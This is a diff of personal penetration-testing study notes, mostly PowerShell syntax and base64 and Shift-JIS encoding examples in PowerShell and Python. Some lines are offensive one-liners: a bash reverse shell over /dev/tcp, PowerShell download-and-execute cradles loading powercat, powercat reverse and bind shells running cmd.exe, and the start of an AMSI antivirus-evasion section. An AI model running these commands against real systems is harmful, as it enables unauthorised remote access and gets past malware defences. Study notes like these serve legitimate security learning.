@@ -349,11 +349,28 @@
       - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~
 
 ** TODO powershell scripting
+   + ~(Get-Host).version~
    + ~Get-Help(help)~
    + ~Set-ExecutionPolicy Unrestricted~
    + ~Get-ExecutionPolicy~
    + #!/bin/bash ~powershell -c ""~ //powershell parse syntax like $var within the parentheses while bash does not
+   + ~echo ([System.Text.Encoding]::Default)~ //get system default text encoding
+   + //the *square brackets*. No reference. But seems [.Net TypeName]::staticMethod is legal in powershell.
 
+*** Base64 encoding in powershell
+   + base 64 encoding
+     #+begin_quote
+     $txt = "こんにちは"
+     $byte = ([System.Text.Encoding]::Default).GetBytes($txt)
+     $b64enc = [Convert]::ToBase64String($byte)
+     #+end_quote 
+   + base 64 decoding
+     #+begin_quote
+     $b64str = "grGC8YLJgr+CzQ=="
+     $b64dec = [Convert]::FromBase64String($b64str) //to 
+     $byte2 = ([System.Text.Encoding]::Default).GetString($b64dec)
+     #+end_quote 
+    
 *** basic syntax
 **** $() //Subexpression operator 
      #+begin_quote
@@ -392,14 +409,13 @@
        &$sb -p2 2 -p1 1 3 //p1 is 1, p2 is 2, rest of args: 3
        &$sb 2 1 3 //p1 is 2, p2 is 1, rest of args: 3
        #+end_src 
-     + 
 
 **** .. //range operator
      + ~1..10~
      + ~foreach ($a in 1..$max) {Write-Host $a}~
      + ~'a'..'f'~
 
-**** $_ //delay bind operator TODO
+**** $_ //delay bind operator, or "this" in foreach TODO
      + ~10..1~
      + ~5..-5 | ForEach-Object {Write-Output $_}~
 
@@ -411,6 +427,9 @@
      + ~$myArray = 1,2,3~
      + ~$SingleArray = ,1~
      + ~Write-Output (,1)[0]~
+
+**** ? //shortcut to where
+     + ~1...5 | ? { $_ % 2 }~ //1 to .5 gives 1 and 0; foreach, if [ (this % 2) -ne 0 ], print this; 
       
 **** -f //format operator
      #+begin_quote
@@ -419,13 +438,18 @@
      
      + ~"{0} {1,-10} {2:N}" -f 1,"hello",[math]::pi~
 
-     
-
 *** powershell DownloadFile && *DownloadString*
-   + ~powershell -c "(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/wget.exe','./wget.exe')"~
-   + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //load the remote script during the session only 
+    + ~powershell -c "(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/wget.exe','./wget.exe')"~
+    + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //load the remote script during the session only 
 
-*** TODO basic params(-nop, -c, etc.)
+*** powercat //! triggers amsi
+    + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //!triggers amsi
+    + ~powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1~ //client mode, port 443, ....ps1 as input(file to be transferred)
+    + ~powercat -c 10.11.0.4 -p 443 -e cmd.exe~ //reverse shell...but why bother
+    + ~powercat -l -p 443 -e cmd.exe~ //bind shell...but why bother
+
+
+
 *** amsi evasion (//"this script contains malicious content and has been blocked by your antivirus software")
      + $evil_0 = "amsicontext"
 **** evasion 1: concatenation
@@ -800,3 +824,21 @@ relay the datagram.
      #+end_quote
      - static caching
 *** Proxy ARP p102
+
+
+* S2 python utilities
+
+** char, string processing
+
+*** encoding and decoding in python
+   + ~str("こ").encode("utf-8").decode("utf-8")~
+   + ~str("こ").encode("shift-jis").decode("shift-jis")~
+   + //Shift-JIS encoded string, in unsigned ints: ~130 177 130 241 130 201 130 191 130 205~ //こんにちは
+   + ~chr(99)~ //'c'
+   + ~hex(130) + hex(177) + hex(130) + hex(241)~ //"0x820xb10x820xf1"
+   + ~b2 = b"\x82\xb1\x82\xf1"~ //b2.__class__ = <bytes>
+   + ~(b2.decode("shift-jis")~ //"こん"
+   + ~codecs.encode(bytes('こんにちは', 'shift-jis'), encoding="base64")~ //b'grGC8YLJgr+CzQ==\n'
+   + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64")~ //b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd'
+   + ~codecs.decode(b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd', encoding="shift-jis")~ //こんにちは
+   + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64").decode("shift-jis")~ //こんにちは
